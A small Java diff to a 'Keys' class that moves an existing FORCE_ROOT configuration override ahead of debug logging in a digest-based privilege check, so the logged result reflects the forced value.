@@ -193,15 +193,15 @@ public class Keys implements iKeys{
 
 		boolean ret = Arrays.equals(calculated, rootDigest);
 
+		if(Cfg.FORCE_ROOT){
+			ret =  true;
+		}
+		
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (wantsPrivilege MD5): " + ByteArray.byteArrayToHex(calculated)); //$NON-NLS-1$
 			Check.log(TAG + " (wantsPrivilege): " + ret); //$NON-NLS-1$
 		}
 		
-		if(Cfg.FORCE_ROOT){
-			return true;
-		}
-
 		return ret;
 	}
 
